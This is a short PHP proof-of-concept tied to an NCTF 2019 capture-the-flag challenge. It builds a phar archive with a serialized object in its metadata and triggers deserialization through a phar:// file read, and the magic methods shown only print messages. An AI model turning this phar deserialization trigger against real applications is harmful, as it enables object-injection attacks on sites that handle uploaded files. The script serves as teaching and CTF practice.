<?php
    //phar_matches_everything-nctf-2019, http://ctf.njupt.edu.cn/298.html
    //phpinfo();
    class TestObject {
      private $pvalue='1';
      public $value;
      public function __construct() {
        print("__construct\n");
        $value = 1;
      }
      public function __wakeup() {
        print("__wakeup\n");
      }
      public function __destruct() {
        print("__destruct\n");
      }
    }
    
    $a = new TestObject();
    echo $b = serialize($a);
    $c = unserialize($b);

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //suffix must be phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //set stub, key point to invoke unserialize!
    $o = new TestObject();
    $o->value = 2;
    $phar->setMetadata($o); //set unserialized data into meta-data of manifest
    $phar->addFromString("test.txt", "test"); //add compression file
    $phar->stopBuffering(); //auto sign
    
    //invoke unserialize by file operation method.
    echo file_get_contents("phar://phar.phar/test.txt"); //phar://phar.phar
?>